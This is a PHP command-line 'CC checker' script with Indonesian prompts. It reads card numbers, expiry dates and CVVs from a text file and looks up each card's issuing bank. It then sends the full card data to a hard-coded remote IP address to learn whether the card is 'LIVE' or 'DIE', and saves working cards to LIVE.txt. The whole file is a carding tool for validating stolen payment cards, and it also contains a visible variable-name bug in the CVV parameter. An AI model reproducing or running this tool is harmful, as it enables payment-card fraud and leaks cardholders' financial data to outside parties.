<?php
error_reporting(0);
date_default_timezone_set("Asia/Jakarta");

class CreditCard extends modules
{
    protected $modules;
    
     public function getbin($ccnum){
       
        $bin = substr($ccnum, 0, 6);
       
        $headers = array();
        $headers[] = 'Connection: keep-alive';
        $headers[] = 'Cache-Control: max-age=0';
        $headers[] = 'Upgrade-Insecure-Requests: 1';
        $headers[] = 'Origin: http://bins.su';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36';
        $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
        $headers[] = 'Referer: http://bins.su/';
        $headers[] = 'Accept-Language: en-US,en;q=0.9';
                
        $respon = $this->request('https://bin-checker.net/api/'.$bin, null, $headers , 'GET');
        
        $scem = $this->getStr($respon[0], '"scheme":"', '"', 1,0);
        $coun = $this->getStr($respon[0], '"code":"', '"', 1,0);
        $type = $this->getStr($respon[0], '"type":"', '"', 1,0);
        $level = $this->getStr($respon[0], '"level":"', '"', 1,0);
        $bank = $this->getStr($respon[0], '"bank":{"name":"', '"', 1,0);
        
        return $scem.'|'.$type.' - '.$level.'|'.$bank.'|'.$coun;
      
    }

    public function checking($ccnum,$ccmonth,$ccyear,$cccvc){
        a:        
        $headers = array();
        $headers[] = 'Connection: keep-alive';
        $getinit = $this->request("http://178.62.44.224/api/?cc=$ccnum|$ccmonth|$ccyear|$ccv&key=6egdy65Fry", null, $headers, 'GET');
        
            if(strpos($getinit[0],'live')){
                return 'LIVE';
            } else if(strpos($getinit[0],'die')){
                return 'DIE';
            } else {
                echo 'UNK';
            }
    }

}
class modules 
{
    public function request($url, $param, $headers, $request = 'POST') 
    {
        $ch = curl_init();
        $data = array(
                CURLOPT_URL             => $url,
                CURLOPT_POSTFIELDS      => $param,
                CURLOPT_HTTPHEADER      => $headers,
                CURLOPT_CUSTOMREQUEST   => $request,
                CURLOPT_HEADER          => true,
                CURLOPT_RETURNTRANSFER  => true,
                CURLOPT_SSL_VERIFYPEER  => false
            );
        curl_setopt_array($ch, $data);
        $execute = curl_exec($ch);
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($execute, 0, $header_size);
        $body = substr($execute, $header_size);
        curl_close($ch);
        return [$body, $header];
    }

    public function uid() {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://www.uuidgenerator.net/api/guid');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$x = curl_exec($ch);
		curl_close($ch);
		return $x;
	}
    
    public function getStr($page, $str1, $str2, $line_str2, $line)
    {
        $get = explode($str1, $page);
        $get2 = explode($str2, $get[$line_str2]);
        return $get2[$line];
    }

    public function fetchCookies($source) 
    {
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $source, $matches);
        $cookies = array();
        foreach($matches[1] as $item) 
        {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }

        return $cookies;
    }

    public function fwrite($namafile, $data)
    {
        $fh = fopen($namafile, "a");
        fwrite($fh, $data);
        fclose($fh);  
    }
    public function freads($filename)
    {
        $fp = fopen($filename, "r");
        $content = fread($fp, filesize($filename));
        //$lines = explode("\n", $content);
        fclose($fp);
        return $content; 
    }
    function generateRandomString($length) {
        $characters = 'abcdefghijklmnopqrstuvwxyz';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
}     

$modules = new modules();
$creditcard = new CreditCard();

awal:
echo "Input FIle (cc.txt) : ";
$fileakun = trim(fgets(STDIN));

if(empty(file_get_contents($fileakun)))
{
    print PHP_EOL."File Akun Tidak Ditemukan.. Silahkan Input Ulang".PHP_EOL;
    goto awal;
}

print PHP_EOL."Total Ada : ".count(explode("\n", str_replace("\r","",file_get_contents($fileakun))))." CC, Letsgo..".PHP_EOL;


echo PHP_EOL."Start Date : ".date("Y-m-d H:i:s").PHP_EOL;
$no = 1;
foreach(explode("\n", str_replace("\r", "", file_get_contents($fileakun))) as $c => $akon)
{   
    $pisah = explode("|", trim($akon));
    $cc = $pisah[0];
    $mon    = $pisah[1];
    $year  = $pisah[2];
    $cvv   = $pisah[3];
    $bin = $creditcard->getbin($cc);
    $tes = $creditcard->checking($cc,$mon,$year,$cvv);
    $cre = "$cc|$mon|$year|$cvv";
    if($tes == "DIE"){
        echo $no.'. DIE - '.$cre.PHP_EOL;
    }else if($tes == "LIVE"){
        $modules->fwrite('LIVE.txt', 'LIVE - '.$cre.'|'.$bin."\n");
        echo $no.'. LIVE - '.$cre.'|'.$bin.PHP_EOL;
    }else{
        echo $no.'. UNK - '.$cre.PHP_EOL;
    }
    
    $no++;
    
} // 
